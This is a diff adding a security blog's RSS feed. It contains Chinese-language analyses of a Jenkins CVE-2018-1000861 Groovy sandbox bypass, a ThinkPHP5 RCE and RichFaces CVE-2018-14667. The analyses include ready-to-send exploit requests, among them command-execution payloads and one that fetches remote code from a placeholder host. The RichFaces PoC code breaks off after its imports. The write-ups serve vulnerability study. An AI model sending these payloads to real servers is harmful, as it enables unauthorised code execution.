@@ -1,0 +1,1606 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+    <title>k1n9's Blog</title>
+    <description>Something Specail</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Sun, 28 Jul 2019 16:03:44 +0800</pubDate>
+    <lastBuildDate>Sun, 28 Jul 2019 16:03:44 +0800</lastBuildDate>
+    <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>CVE-2018-1000861 Stapler动态路由导致的任意方法调用</title>
+        <description>&lt;p&gt;影响版本：
+&amp;lt;= 2.137&lt;/p&gt;
+
+&lt;p&gt;插件：
+Pipeline: Declarative Plugin up to and including 1.3.4&lt;br /&gt;
+Pipeline: Groovy Plugin up to and including 2.61&lt;br /&gt;
+Script Security Plugin up to and including 1.49&lt;/p&gt;
+
+&lt;p&gt;Groovy Plugin up to and including 2.0&lt;br /&gt;
+Warnings Plugin up to and including 5.0.0&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2018-1000861-流程调试分析&quot;&gt;CVE-2018-1000861 流程调试分析：&lt;/h2&gt;
+
+&lt;p&gt;从 web.xml 看可知 Jenkins 的请求都是先交给 org.kohsuke.stapler.Stapler 类进行处理，其 service 方法大抵如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d5214ac88061118.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到它会根据 url 来给 invoke 方法传入不同的根节点对象，如果 url 以 /$stapler/bound/ 开头，根节点对象为 org.kohsuke.stapler.bind.BoundObjectTable，否则为 hudson.model.Hudson（继承自 jenkins.model.Jenkins）。往前跟，到进入 org.kohsuke.stapler.Stapler#tryInvoke&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52158987d26335.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;根节点对象 hudson.model.Hudson 属于 StaplerProxy 类的实例，所以执行会进入到 if 的语句块。这里的 getTarget 来自 jenkins.model.Jenkins#getTarget&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d5215d661b34622.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;能看到有对读权限的检测，如果在未登录 Jenkins 的情况下是以匿名者的身份去访问的，默认情况下匿名者没有任何的权限。这里在捕获到异常的后还会拿 url 来做一次检测，如果符合条件的话，依然能成功返回。跟进 isSubjectToMandatoryReadPermissionCheck 方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52176cbe095375.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;总的来说有三种情况是可以在没有读权限的情况下继续进行访问的（这里为后面构造攻击利用提供了一个无需读权限的点），这里只看第一个&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52164a21636235.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;只要 url 符合上图列出的这些就可以，这里用到的是 securityRealm&lt;/p&gt;
+
+&lt;p&gt;继续执行 tryInvoke 方法的后面部分&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d521c1682011127.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;获取到根节点对象的所有 Dispatcher（其具体的生成过程往 getMetaClass 方法里跟就能看到），然后逐个传入当前的请求进行调用。根据监控窗口可以看出来这里的 Dispatcher 有 218 个，Dispatcher 是根据根节点对象中成员变量或方法等生成的，其对应着不同的 url。url 对应着的调用关系可以参考 Stapler 的&lt;a href=&quot;http://stapler.kohsuke.org/reference.html&quot;&gt;文档&lt;/a&gt;，这里简单列下其中几种：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. Action 方法
+/fooBar/ =&amp;gt; node.doFooBar()
+
+2. Public 成员
+/fooBar/ =&amp;gt; node.fooBar
+
+3. Public Getter 方法
+/fooBar/ =&amp;gt; node.getFooBar()
+
+4. Public Getter 方法带一个字符串或整数参数
+/fooBar/test/ =&amp;gt; node.getFooBar(test)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;进入 org.kohsuke.stapler.NameBasedDispatcher#dispatch&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d521e143db61222.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到这里是用 url 跟 Dispatcher 的名称进行了对比，然后再拿 url 剩余的层级数跟参数个数进行了比较，如果符合条件的话就调用 doDispatch 方法，不然就继续前面的循环。这里的 doDispatch 方法是在生成 Dispatcher 的时候就建立了的，往下跟&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d521f0b8ea98104.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里的 ff 是 org.kohsuke.stapler.Function 类对象，其中保存了根节点对象中方法的各种信息，当调用其 invoke 方法的时候便通过反射来对实际的方法进行调用，返回的结果作为新的根节点对象再进入 org.kohsuke.stapler.Stapler#invoke 执行跟前面一样的流程，一直做递归调用直到把 url 全部解析完，这样便实现了动态路由解析。针对其它的 Dispatcher 的处理流程跟这个也差不多。 到这里其实把 Stapler 的动态路由功能实现简单的过了一遍，如果从安全的角度来考虑就明白这里是存在着任意方法调用的问题的，即使前面看到了有对读权限的检测，但也有不需要读权限的地方，如果把这些点串起来就能够形成一个完整的利用链。&lt;/p&gt;
+
+&lt;h2 id=&quot;rce-的利用链&quot;&gt;RCE 的利用链&lt;/h2&gt;
+
+&lt;p&gt;Orange 大佬在博客中提到的部分利用链&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在有前面的知识基础下，这个利用链还是很好理解的，实际调用过程如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Jenkisn.getSecurityRealm() -&amp;gt; HudsonPrivateSecurityRealm.getUser([username]) -&amp;gt; Jenkins.getDescriptorByName([descriptor_name])
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这里要提一下的是 User 类在 2.138 （2018/8/14 发布）版后做了修改，添加了对接口 StaplerProxy 的实现，然后重写 getTarget 方法，其中加了对读权限的检测。在前面知道如果是属于 StaplerProxy 类的实例在 org.kohsuke.stapler.Stapler#tryInvoke 中是会调用到其 getTarget 方法的。所以这个利用链在 2.138 版后就用不了了。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d5233ef37880142.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;getDescriptorByName 最终调用的是 jenkins.model.Jenkins#getDescriptor&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52361951131077.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;先获取所有的 Descriptor，然后用完整的类名（带包名）或类名跟传入的字符串 id 做比较来获取相对应的 Descriptor。再通过寻找一些有利用点的 Descriptor 便可以构造出完整的利用链。&lt;/p&gt;
+
+&lt;p&gt;在 Jenkins 2019-01-08 和 2019-01-28 的安全通告中都包含有 Groovy 沙盒绕过的问题。拿 Groovy Plugin 做例子来看一下其在 Github 上的 diff&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d523889cfc48005.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d5237be8ea24042.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里的 doCheckScript 方法会将传进来的 command 参数的值当作 Groovy 脚本进行解析&lt;/p&gt;
+
+&lt;p&gt;类似的点还有，都可以在 Jenkins 的 Github 上通过看 commit 找到。但这里存在一个问题是它只调用了 parse 方法来解析而没有去执行脚本，那这里究竟是怎么做到的 RCE ？&lt;/p&gt;
+
+&lt;p&gt;其实看这几个插件在 Github 的 diff 或新加的测试代码，就能想到问题肯定是出在 ASTTest 和 Grab 这两注解上面，但具体的原因还得跟过去看才行。&lt;/p&gt;
+
+&lt;h2 id=&quot;调试跟踪-groovyshell-的-parse-方法&quot;&gt;调试跟踪 GroovyShell 的 parse 方法&lt;/h2&gt;
+&lt;p&gt;顺着 parse 往下跟，直到 groovy.lang.GroovyClassLoader#doParseClass 方法，从 parse 方法到这里的过程都比较容易理解就不贴出来了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d523ceedac27353.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从这里开始简单分析下 Groovy 做解析的过程（纯粹是通过看到的代码的个人理解，可能会有错误）。doParseClass 方法的前面部分就是从 codeSource 中把 Groovy 脚本取出来然后加入到新构建好的编译单元中去等一些操作。这里要说的是在执行 unit.complie 方法的时候传入的 goalPhase 参数，这个 goalPhase 代表了编译的时候要执行到哪个一个阶段，Groovy 做编译一共有 9 个阶段&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d523e0211376861.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;初始化&lt;/li&gt;
+  &lt;li&gt;词法分析，生成 CST（具体语法树）&lt;/li&gt;
+  &lt;li&gt;CST 转换成 AST（抽象语法树）&lt;/li&gt;
+  &lt;li&gt;AST 语义分析&lt;/li&gt;
+  &lt;li&gt;AST 分析完成&lt;/li&gt;
+  &lt;li&gt;类生成（阶段 1，指令部分）&lt;/li&gt;
+  &lt;li&gt;类生成完成&lt;/li&gt;
+  &lt;li&gt;输出字节码到硬盘&lt;/li&gt;
+  &lt;li&gt;最后阶段，做清理操作&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这样就好理解为什么在配置 config 中存在目标路径的时候会设置成 8 了，这里设置的值为 7，所以只会完成到类生成部分。跟进去&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52401632679237.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;大体上看就是处理每个阶段所有做的操作了，值得注意的是整个过程中它在每个阶段都会去检测 progressCallback 是否为空，如果不为空就调用它的 call 方法。&lt;/p&gt;
+
+&lt;p&gt;一直跟到第 4 阶段，也就是做 AST 语义分析的时候，看它是如何处理 ASTTest 注解的。顺着 processPhaseOperations 往下跟就能看到完整的过程，过程还挺长的，这里就不列了，代码里面用到了访问者设计模式。直接跟到 org.codehaus.groovy.transform.ASTTransformationVisitor#visitClass&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d523e9e33f19701.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟进去就能看到能做 RCE 的点了，org.codehaus.groovy.transform.ASTTestTransformation#visit&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d52503b5df90022.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这不仅是创建了 progressCallback，还在 call 方法里执行了 Groovy 脚本，脚本的来源参数 testSource 的值还是可控的。&lt;/p&gt;
+
+&lt;p&gt;因为是在第 4 阶段就设置了 progressCallback，所以到第 7 阶段结束的时候，这方法一共会执行 4 次。&lt;/p&gt;
+
+&lt;p&gt;Groovy Plugin 2.0 Payload（其它的点也是类似的操作）&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /jenkins/securityRealm/user/test/descriptorByName/StringScriptSource/checkScript?command=import%20groovy.transform.%2a%0A@ASTTest%28value%3D%7B%20%22open%20/applications/calculator.app%22.execute%28%29%20%7D%29%0A@Field%20int%20x%0A HTTP/1.1
+Host: hack.lo:8080
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36
+DNT: 1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,fr;q=0.7,zh-TW;q=0.6,da;q=0.5,mt;q=0.4
+Cookie: 
+Connection: close
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Fri, 15 Feb 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2019/02/15/jenkins-cve-2018-1000861.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/02/15/jenkins-cve-2018-1000861.html</guid>
+        
+        <category>Java</category>
+        
+        <category>Jenkins</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>ThinkPHP5 RCE</title>
+        <description>&lt;p&gt;主要成因为框架中的核心类 Request 中存在调用任意（其实不能算是任意）方法的点，通过构造可以做成 RCE。&lt;/p&gt;
+
+&lt;p&gt;这是 ThinkPHP 最近出的第二个影响比较大的 RCE 了，虽然对 ThinkPHP 不熟悉，不过这个洞的成因和利用还是比较有意思的，再加上已经好久没去分析 PHP 方面的漏洞了，写下分析当个记录了。全程是根据别人的分析静态跟代码加上在环境上测试完成的，没有做动态跟踪（懒得去弄了）。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-影响版本&quot;&gt;0x00 影响版本&lt;/h2&gt;
+&lt;p&gt;5.0 - 5.0.23&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-漏洞分析及利用构造&quot;&gt;0x01 漏洞分析及利用构造&lt;/h2&gt;
+&lt;p&gt;进入到漏洞关键点的执行流程：
+think\App#run –&amp;gt; think\App#routeCheck –&amp;gt; think\Route#check –&amp;gt; think\Request#method&lt;/p&gt;
+
+&lt;p&gt;think\Request#method 具体代码如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ff3a809a84077.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在前面的执行流程中调用到 method 方法的时候是不带参数的，所以这里的形参 $method 的实际值为 false，另外 Config::get(‘var_method’) 的值来自于 convention.php 默认为 _method。虽然这里会把字符串变成大写，但是在 PHP 中方法名大小写不敏感，因此在图中的红框处就能实现 Request 中任意方法的调用（当然了得参数类型符合）。&lt;/p&gt;
+
+&lt;p&gt;这里选择的类 Request 中的方法为其构造方法，具体代码如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ff434b5d96219.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;选择这个方法主要是为了覆盖类 Request 中的成员变量的值，为后面的利用做准备。&lt;/p&gt;
+
+&lt;p&gt;再看 think\Request#param
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ff71b8a875794.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当 mergeParam 为空时会调用到 get 方法，其实这里在执行 $this-&amp;gt;method(true) 一样会调用到下面说的 input 方法，这里就跟下 get。跟进 think\Request#get
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ff57604131870.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续跟进 think\Request#input
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ffc25f3461402.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;data 的值来自 Request 中的 get（数组），所以会调用到 array_walk_recursive 函数，而这个函数设置的 callback 函数为 filterValue。漏洞的利用点就在 filterValue 中，其代码如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ffb5779269155.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;主要就是用 call_user_func 来做成 RCE，因此 filter 和 value 的值需要可控，顺着调用流程往回看和结合前面提到的在构造方法中做覆盖的方法就能知道怎么去控制这两个变量的值。结合前面提到的 value 的值其实就来自于 Request 类中的 get，再来看 filter，很明显能知道 filter 的值来自 getFilter 方法的执行结果，think\Request#getFilter
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ff8dbf5658046.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个方法的代码逻辑比较简单的，要控制 filter 的值的话，就只需要在 POST 请求中传个 filter 的值就行了。到这里可以知道的了 PoC 中需要构造的请求如下&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST
+_method=__construct&amp;amp;mergeParam&amp;amp;=filter=system&amp;amp;get[]=id
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;接下来只要找到办法调用 think\Request#param 就可以完成整个利用了。think\App#run 中存在如下代码
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ffc6e19e95420.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以要是在开启了调试模式的情况下用前面的构造好的请求就可以完成利用了，但是 23 版本在默认情况下是没有开启调试模式的，再看下在没有开启调试模式的情况下如何利用。&lt;/p&gt;
+
+&lt;p&gt;回看 think\Route#check 中调用 think\Request#method 往后的代码
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d500ac520669420.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里的 method 的值其实就来自于 Request 类中的 method，因此可控。往下就是根据 method 的值来获取路由规则，这里需要用到验证码类（只在完整版中有，核心版中没有）中的一个路由规则，规则如下
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d50075e4fa55273.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以要是想获取到这个路由规则就得传参 s=captcha 来完成类的自动加载同时设置 method 的值为 get。这里获取这个路由规则的主要目的是为了完成漏洞的利用，往下跟就明白了。接下来的执行流程为 think\Route#checkRoute –&amp;gt; think\Route#checkRule –&amp;gt; think\Route#parseRule&lt;/p&gt;
+
+&lt;p&gt;parseRule 方法中的部分代码
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d500b7f0ef71486.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里主要是根据路由规则的格式返回不同的结果，这里返回的结果中 type 为 method。结果返回赋值给 think\App 类中的 dispatch。往下跟进 think\App#exec
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d500eb615074412.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到这里就能成功调用到了漏洞利用需要的 param 方法。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-poc&quot;&gt;0x02 PoC&lt;/h2&gt;
+&lt;p&gt;开启调试模式&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /index.php
+_method=__construct&amp;amp;filter=system&amp;amp;get[]=id
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;关闭调试模式&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /index.php?s=captcha
+_method=__construct&amp;amp;filter=system&amp;amp;get[]=id&amp;amp;method=get
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;另外一种控制 value 的方法&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_method=__construct&amp;amp;filter=system&amp;amp;server[REQUEST_METHOD]=id&amp;amp;method=get
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_method=__construct&amp;amp;filter=assert&amp;amp;server[HTTP_HOST]=file_get_contents('http://x.x.x.x/tp');
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;包含文件&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_method=__construct&amp;amp;method=get&amp;amp;filter[]=think\__include_file&amp;amp;server[]=phpinfo&amp;amp;get[]=/tmp/xx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;0x03-参考&quot;&gt;0x03 参考&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;一份漏洞分析文档&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ&quot;&gt;启明星辰ADLab：ThinkPHP5核心类Request远程代码漏洞分析&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Sun, 13 Jan 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2019/01/13/thinkphp5-rce.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/01/13/thinkphp5-rce.html</guid>
+        
+        <category>PHP</category>
+        
+        <category>ThinkPHP5</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>RichFaces CVE-2018-14667</title>
+        <description>&lt;p&gt;影响：3.x ~ 3.3.4(3.x 中最高的版本，官方在 2016 年已经停止维护该项目)&lt;/p&gt;
+
+&lt;p&gt;据漏洞的描述为可以通过 org.ajax4jsf.resource.UserResource$UriData 构造恶意的反序列化数据（里面插入 EL 来执行代码），从而攻击者可以在未认证的情况下实现远程代码执行的效果。&lt;/p&gt;
+
+&lt;h3 id=&quot;richfaces-中的反序列的点&quot;&gt;RichFaces 中的反序列的点&lt;/h3&gt;
+
+&lt;p&gt;从官网下载 richfaces-demo-3.3.4.Final.war 作为测试对象，&lt;/p&gt;
+
+&lt;p&gt;在 BaseFilter#doFilter 中检测是否为资源服务请求（这是个人理解，对 RichFaces 并不熟悉）处下一个断点开始跟踪调试
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4eceb334225199.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;往前跟到进入 WebXml#getFacesResourceKey
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ed50322933944.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个方法传入的参数就是 url，然后通过 url 的开头和三种资源的前缀来对比区分请求的资源类型，这三种资源前缀分别为
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ebe17f5533493.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再加上版本号，接下来是截取了相应的前缀和后缀（.jsf）后将中间的值返回&lt;/p&gt;
+
+&lt;p&gt;继续往下跟进入 InternetResourceService#serviceResource 就是用前面获取到的返回值作为 resourceKey 去找相对应的 resource
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ec3f113b13924.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;往下跟的时候发现前面传进来的 resourceKey 还会根据 DAT(A&lt;/td&gt;
+      &lt;td&gt;B) 来截取一次作为 key&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ec46e4fc53300.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里就有一开始看这个洞的时候比较疑惑的一点，org.ajax4jsf.resource.UserResource 没有注册，直接会抛出上图中的那个异常了。也没找到这个流程中能注册 resource 的点，还以为是得修改服务端的配置添加这个 resource 了，后来看了别人的文章才发现在 MediaOutputRenderer#doEncodeBegin 中有对 UserResource 的创建，它是在对 jsf 的 mediaOutput 标签解析中执行的。在 demo 中动态生成图片处查看它的 url 
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ec2547d830697.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此在利用的过程中需要用到 demo 中这个已经注册的 UserResource 的 key，在这里是 org.ajax4jsf.resource.UserResource/n/s/-1487394660，如果这里的 key 是已经注册了的就可以继续往下跑了，到进入 ResourceBuilderImpl#getResourceDataForKey
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ed2122c245873.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;这个方法的大体流程为截取 DAT(A&lt;/td&gt;
+      &lt;td&gt;B) 后的数据进行解密，然后做反序列化，代码中其实可以看到只有是 DATA 的时候才会做反序列化，DATB 是直接作为对象数组处理了。这里处理输入流的类重写了 resolveClass 方法，做了白名单的检测，要用到的 org.ajax4jsf.resource.UserResource$UriData 就在白名单中，就不跟过去看了。&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;这个洞的利用并不是反序列化来触发的，触发点还在后面。&lt;/p&gt;
+
+&lt;h3 id=&quot;触发-el-执行&quot;&gt;触发 EL 执行&lt;/h3&gt;
+
+&lt;p&gt;接下来的执行流程还是在 InternetResourceService#serviceResource 中，将反序列化获取到的对象存入 resourceContext 中，往下直到进入
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ebd0fcdb84254.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这其中还是有条件判断是否能执行到这一步，不过默认的情况下没看到有影响。跟下去会发现调用到了 UserResource#send，最终在 invoke 处执行了 EL
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ed3b56cb28700.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上面这个只是 EL 执行的其中一处，看 InternetResourceBase#sendHeaders
+&lt;img src=&quot;https://i.loli.net/2019/07/28/5d3d4ee35572657589.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;红圈的这两处其实就是调用的 UserResource#getLastModified 和 UserResource#getExpired，这三处都是可以执行 EL 的，执行流程中的顺序为 UserResource#getLastModified、UserResource#getExpired 和 UserResource#send。&lt;/p&gt;
+
+&lt;h3 id=&quot;poc&quot;&gt;PoC&lt;/h3&gt;
+
+&lt;p&gt;简单修改了一下随风师傅的 PoC，改成了在 UserResource#getLastModified 处触发执行&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;javax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;faces&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.ajax4jsf.util.base64.Codec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;util.Reflections&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.el.ValueExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
